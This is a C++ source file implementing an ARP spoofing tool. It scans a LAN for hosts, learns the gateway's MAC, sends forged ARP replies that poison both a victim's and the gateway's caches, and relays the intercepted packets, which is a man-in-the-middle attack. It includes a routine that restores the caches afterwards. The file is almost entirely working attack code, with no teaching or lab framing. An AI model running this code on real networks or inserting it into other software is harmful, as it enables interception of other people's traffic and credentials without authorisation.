#include "netinfo.h"
#include "arpspoof.h"
/*
Packet::Result ArpSpoof::read(Packet* packet) {
    while (true) {
        if (state_ != Opened)
            return Packet::Fail;

        Packet::Result res = PcapDevice::read(packet);
        if (res == Packet::Eof || res == Packet::Fail) return res;
        if (res == Packet::None) continue;

        EthHdr* ethHdr = packet->ethHdr_;
        // attacker sending packet?
        Mac smac = ethHdr->smac();
        if (smac == myMac_) continue;
        if (smac.isBroadcast() || smac.isMulticast()) continue;

        uint16_t type = ethHdr->type();
        if (type == EthHdr::Arp) {
            ArpHdr* arpHdr = packet->arpHdr_;
            {
                std::lock_guard<std::mutex> lock(infectionList_.m_);
                for (Flow& flow: infectionList_) {
                    bool infect = false;
                    if (arpHdr->sip() == flow.ip_ && arpHdr->smac() != flow.mac_ && arpHdr->tip() == gwIp_) { // sender > target ARP packet
                        infect = true;
                    } else
                        if (arpHdr->sip() == gwIp_ && arpHdr->smac() != flow.mac_ && ethHdr->dmac() == Mac::broadcastMac()) { // target to any ARP packet
                            infect = true;
                        }
                    if (infect)
                        sendInfect(flow);
                }
            }
            continue;
        }
    }
    return Packet::Fail; // remove warning: non-void function does not return a value in all control paths
}*/

void ArpSpoof::readPacket(){
    while (true) {
        EthPacket packet;
        Packet::Result res = read(&packet);
        if (res == Packet::Eof) {
            spdlog::info("Arpspoof::Packet::Eof");
            break;
        } else
        if (res == Packet::Fail) {
            spdlog::info("Arpspoof::Packet::Fail");
            break;
        } else
        if (res == Packet::None) {
            spdlog::info("Arpspoof::Packet::None");
            continue;
        }
        spdlog::info("Arpspoof::Packet::correct");
        ArpHdr* arpHdr = packet.arpHdr_;
        if (arpHdr == nullptr) continue;
        if (arpHdr->op() != ArpHdr::Reply) continue;

        Ip sip = arpHdr->sip();
        Mac smac = arpHdr->smac();

        if (sip == gwIp_) {
            gwMac_ = smac;
            spdlog::info("Get gatewayMac!!"+std::string(gwMac_));
            flag = false;
            break;
        }
    }
}

bool ArpSpoof::prepare()
{
    bool res = PcapDevice::doOpen();
    if (!res) return false;
    spdlog::info("Arpspoof::Pcapdevice open");
    readPacket_ = new std::thread(&ArpSpoof::readPacket,this);
    //find gateway mac
    while(flag) {
        sendQuery(gwIp_);
        std::this_thread::sleep_for(std::chrono::seconds(sendSleepTime_));
    }
    readPacket_->join();
    return true;
}

bool ArpSpoof::doOpen()
{
    //find best interface
    RtmEntry* entry = NetInfo::instance().rtm().getBestEntry(std::string("8.8.8.8"));
    if (entry != nullptr) {
        intf_ = entry->intf();
        gwIp_ = intf_->gateway();
        if (intf_ != nullptr)
            intfName_ = intf_->name();
    }
    myIp_ = intf_->ip();
    myMac_ = intf_->mac();
    return true;
}

bool ArpSpoof::doClose()
{
    return PcapDevice::doClose();
}

void ArpSpoof::hostScan()
{
    Ip begIp = (myIp_ & intf_->mask()) + 1;
    Ip endIp = (myIp_ | ~intf_->mask());

    EthArpPacket packet;

    EthHdr* ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::broadcastMac();
    ethHdr->smac_ = myMac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr* arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Request);
    arpHdr->smac_ = myMac_;
    arpHdr->sip_ = htonl(myIp_);
    arpHdr->tmac_ = Mac::nullMac();

    while (active()) {
        for (Ip ip = begIp; ip <= endIp; ip = ip + 1) {
            arpHdr->tip_ = htonl(ip);
            if (!active()) break;
            Packet::Result res = write(Buf(pbyte(&packet), sizeof(packet)));
            if (res != Packet::Ok) {
                spdlog::info("Arpspoof::hostscan::error");
                break;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        }
        if (!active()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(rescanSleepTime_));
    }

}

bool ArpSpoof::processArp(EthHdr* ethHdr, ArpHdr* arpHdr, Mac* mac, Ip* ip)
{
    //already infected
    if (ethHdr->smac() != arpHdr->smac()) {
        spdlog::info("ARP spoofing detected by arp " + std::string(ethHdr->smac()) + " " + std::string(arpHdr->smac()) +" "+ std::string(arpHdr->sip()));
        return false;
    }
    *mac = arpHdr->smac();
    *ip = arpHdr->sip();
    spdlog::info("Host detected by arp " + std::string(*mac) + " " + std::string(*ip));
    return true;
}

bool ArpSpoof::processDhcp(Packet* packet, Mac* mac, Ip* ip)
{
    UdpHdr* udpHdr = packet->udpHdr_;
    if (udpHdr == nullptr) return false;

    if (!(udpHdr->sport() == 67 || udpHdr->dport() == 67)) return false;

    Buf dhcp = packet->udpData_;
    if (dhcp.data_ == nullptr) return false;
    if (dhcp.size_ < sizeof(DhcpHdr)) return false;

    DhcpHdr* dhcpHdr = PDhcpHdr(dhcp.data_);

    bool ok = false;
    if (dhcpHdr->yourIp() != 0) { // DHCP Offer of DHCP ACK sent from server
        *mac = dhcpHdr->clientMac();
        *ip = dhcpHdr->yourIp();
        ok = true;
    }
    spdlog::info("Host detected by dhcp " + std::string(*mac) + " " + std::string(*ip));
    return ok;
}

bool ArpSpoof::processIp(EthHdr* ethHdr, IpHdr* ipHdr, Mac* mac, Ip* ip) {
    Ip sip = ipHdr->sip();
    if (sip == gwIp_) return false;
    if (!intf_->isSameLanIp(sip)) return false;

    *mac = ethHdr->smac();
    *ip = sip;
    return true;
}

Flow ArpSpoof::detect(Packet* packet)
{
    Mac mac;
    Ip ip;
    Flow host;

    EthHdr* ethHdr = packet->ethHdr_;
    if (ethHdr == nullptr) return host;

    mac = ethHdr->smac();
    if (mac == myMac_) return host;

    bool detected = false;

    //find by dhcp packet
    IpHdr* ipHdr = packet->ipHdr_;
    if (ipHdr != nullptr && ipHdr->sip() != myIp_) {
        if (processDhcp(packet, &mac, &ip))
            detected = true;
        else if (processIp(ethHdr, ipHdr, &mac, &ip))
            detected = true;
    }

    //find by arp packet
    ArpHdr* arpHdr = packet->arpHdr_;
    if (arpHdr != nullptr && arpHdr->sip() != myIp_) {
        if (processArp(ethHdr, arpHdr, &mac, &ip))
            detected = true;
    }

    if (!detected) return host;

    host.mac_ = mac;
    host.ip_ = ip;
    struct timeval now;
    gettimeofday(&now, NULL);
    host.lastAccess_ = now; // for check 15min

    spdlog::info("host detected: "+ std::string(mac) + " " + std::string(ip));
    return host;
}


bool ArpSpoof::sendQuery(Ip tip)
{
    EthArpPacket query;
    query.ethHdr_.dmac_ = Mac::broadcastMac();
    query.ethHdr_.smac_ = intf_->mac();
    query.ethHdr_.type_ = htons(EthHdr::Arp);

    query.arpHdr_.hrd_ = htons(ArpHdr::ETHER);
    query.arpHdr_.pro_ = htons(EthHdr::Ip4);
    query.arpHdr_.hln_ = sizeof(Mac);
    query.arpHdr_.pln_ = sizeof(Ip);
    query.arpHdr_.op_ = htons(ArpHdr::Request);
    query.arpHdr_.smac_ = intf_->mac();
    query.arpHdr_.sip_ = htonl(intf_->ip());
    query.arpHdr_.tip_ = htonl(tip);
    query.arpHdr_.tmac_ = Mac::nullMac();
    Buf queryBuf(pbyte(&query), sizeof(query));

    Packet::Result res;
    for(int i =0; i<3; i++) {
        res = write(queryBuf);
        if (res != Packet::Ok) {
            spdlog::info("Arpspoof::sendquery::error");
            return false;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
    }
    spdlog::info("Arpspoof::sendquery::correct");
    return true;
}

void ArpSpoof::makeArppacket(Mac dmac, Mac smac, Mac tmac, Ip tip, Ip sip)
{
    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = dmac;
    ethHdr->smac_ = smac;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = smac;
    arpHdr->sip_ = htonl(sip);
    arpHdr->tmac_ = tmac;
    arpHdr->tip_ = htonl(tip);
}

bool ArpSpoof::sendInfect(Flow flow)
{
    spdlog::info(string(flow.ip_));
    //  sender send
    {
        std::lock_guard<std::mutex> lock(m);
        makeArppacket(flow.mac_,intf_->mac(),flow.mac_,flow.ip_,gwIp_);
    }
    Packet::Result res;
    for (int i = 0 ; i < 3 ; i++) {
        res = write(Buf(pbyte(&packet), sizeof(packet)));
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        if (res != Packet::Ok) {
            spdlog::info("Arpspoof::infection::error");
            return false;
        }
    }

    //  target send
    {
        std::lock_guard<std::mutex> lock(m);
        makeArppacket(gwMac_,intf_->mac(),gwMac_,gwIp_,flow.ip_);
    }
    for (int i = 0 ; i < 3 ; i++) {
        res = write(Buf(pbyte(&packet), sizeof(packet)));
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        if (res != Packet::Ok) {
            spdlog::info("Arpspoof::infection::error");
            return false;
        }
    }
    spdlog::info("Arpspoof::infection::success " +std::string(flow.mac_)+" "+std::string(flow.ip_));
    return res;
}

bool ArpSpoof::sendRecover(Flow flow)
{
    spdlog::info(string(flow.ip_));
    {
        std::lock_guard<std::mutex> lock(m);
        makeArppacket(gwMac_,flow.mac_,gwMac_,gwIp_,flow.ip_);
    }

    Packet::Result res;
    for (int i = 0 ; i < 3 ; i++) {
        res = write(Buf(pbyte(&packet), sizeof(packet)));
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        if (res != Packet::Ok) {
            spdlog::info("Arpspoof::recover::error");
            return false;
        }
    }

    //  target send
    {
        std::lock_guard<std::mutex> lock(m);
        makeArppacket(flow.mac_,gwMac_,flow.mac_,flow.ip_,gwIp_);
    }

    for (int i = 0 ; i < 3 ; i++) {
        res = write(Buf(pbyte(&packet), sizeof(packet)));
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        if (res != Packet::Ok) {
            spdlog::info("Arpspoof::recover::error");
            return false;
        }
    }
    spdlog::info("Arpspoof::recover::success " +std::string(flow.mac_)+" "+std::string(flow.ip_));
    return true;
}

Packet::Result ArpSpoof::relay(Packet* packet) {
    packet->ethHdr_->smac_ = intf_->mac_;
    Packet::Result res;
    for (int i = 0 ; i < 3 ; i++) {
        res = write(packet);
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        if (res != Packet::Ok) {
            spdlog::info("Arpspoof::relay::error");
            return res;
        }
    }
    return res;
}

